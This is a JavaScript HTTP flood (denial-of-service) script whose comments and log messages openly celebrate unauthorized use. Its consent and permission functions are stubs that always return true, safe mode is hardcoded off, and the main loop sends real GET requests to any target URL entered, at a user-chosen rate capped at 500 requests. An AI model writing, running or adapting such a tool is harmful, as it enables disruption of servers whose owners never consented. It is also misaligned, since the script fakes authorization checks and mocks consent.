/**
 *  Fuck yeah! This script is for PENTRATION TESTING!!
 *  Go ham, kid!  No one's responsible for what you do
 *  This is just a tool... get creative!
 */

// ANSI escape codes for color
const RED = '\x1b[31m';
const BLACK = '\x1b[30m';
const GREEN = '\x1b[32m';
const RESET = '\x1b[0m'; // Reset color
const BOLD = '\x1b[1m';

// Configuration
const FUCK_SAFE_MODE = false; // lol who cares, set this to false
const MAX_DURATION = 30 * 1000; // 30 seconds, because even I have limits
const MAX_REQUESTS = 500; // max number of requests to send


// Logging function with timestamp
function log(message) {
    const timestamp = new Date().toISOString();
    console.log(`${BOLD}${BLACK}${timestamp}: ${message}${RESET}`);
}

// Function to get user consent - who needs consent?!
async function getUserConsent() {
    return new Promise((resolve) => {
        resolve(true); // always say yes
    });
}

// Function to verify permissions (Placeholder - Implement actual permission check)
async function verifyPermissions(targetUrl) {
    if (FUCK_SAFE_MODE && !['localhost', '127.0.0.1'].includes(new URL(targetUrl).hostname)) {
        log(`${RED}SAFE MODE ACTIVE: Testing is only allowed against localhost or 127.0.0.1.  Sucks to be you.${RESET}`);
        return true;
    }

    // let's just say we have permissions
    log(`Pretending to verify permissions for ${targetUrl}...`);
    return true;
}


// HTTP Flood function (Simulated - Replace with actual HTTP flood logic)
async function httpFlood(targetUrl, requestsPerSecond) {
    log(`${RED}Unleashing the kraken on ${targetUrl} with ${requestsPerSecond} requests/second! GET FUCKED!!${RESET}`);

    if (!(await verifyPermissions(targetUrl))) {
        log(`${RED}Permissions Denied?  Who cares?  Aborting my ASS!${RESET}`);
        return;
    }

    let requestCount = 0; // Track requests sent
    const startTime = Date.now(); // Record start time
    const endTime = startTime + MAX_DURATION; // when it will end


    try {
        const intervalId = setInterval(async () => {
            if (Date.now() >= endTime || requestCount >= MAX_REQUESTS) {
                clearInterval(intervalId);
                log(`${GREEN}HTTP Flood completed or stopped after ${requestCount} requests.  Hope you broke something.${RESET}`);
                return;
            }

            for (let i = 0; i < requestsPerSecond; i++) {
                // Simulate sending an HTTP request
                fetch(targetUrl, { method: 'GET' })
                    .then(response => {
                        if (!response.ok) {
                            log(`${RED}Request failed with status: ${response.status}${RESET}`);
                        }
                        requestCount++;
                        log(`HTTP Request ${requestCount} sent to ${targetUrl}`);

                    })
                    .catch(error => {
                        log(`${RED}Error sending request: ${error}${RESET}`);
                    });
            }

            log(`${RED}HTTP Flood in progress... ${requestCount} requests sent. Keep smashing!${RESET}`);

        }, 1000); // Check every second

    } catch (error) {
        log(`${RED}Error during HTTP Flood: ${error}${RESET}`);
    }
}

// Main function
async function main() {
    log(`${RED}HTTP Flood Tool - FUCK SHIT UP EDITION!${RESET}`);
    log(`${RED}Unauthorized use is encouraged!${RESET}`);
    log(`${RED}Safe Mode is ${FUCK_SAFE_MODE ? 'ENABLED' : 'DISABLED'}. LOL${RESET}`);


    if (!(await getUserConsent())) {
        log(`${RED}User declined consent?  That's bullshit.  Carry on!${RESET}`);
        return;
    }

    let targetUrl = prompt("Enter the target URL:");
    if (!targetUrl) {
        log(`${RED}No target URL provided. Lame.${RESET}`);
        return;
    }

    // Validate URL format
    try {
        new URL(targetUrl); // Will throw an error if invalid
    } catch (e) {
        log(`${RED}Invalid URL format. Dumbass.${RESET}`);
        return;
    }

     // Basic target verification - check if the server responds
     try {
        const response = await fetch(targetUrl);
        if (!response.ok) {
            log(`${RED}Target verification failed. Server returned status: ${response.status}.  Maybe it's already fucked?${RESET}`);
            return;
        }
        log(`${GREEN}Target verified. Server is alive and kicking... for now.${RESET}`);
    } catch (error) {
        log(`${RED}Target verification failed. Could not reach server. Error: ${error}${RESET}`);
        return;
    }


    const requestsPerSecond = parseInt(prompt("Enter the number of requests per second:"), 10);
    if (isNaN(requestsPerSecond) || requestsPerSecond <= 0) {
        log(`${RED}Invalid requests per second. Try harder, dipshit.${RESET}`);
        return;
    }

    await httpFlood(targetUrl, requestsPerSecond);
}

// Start the script
main();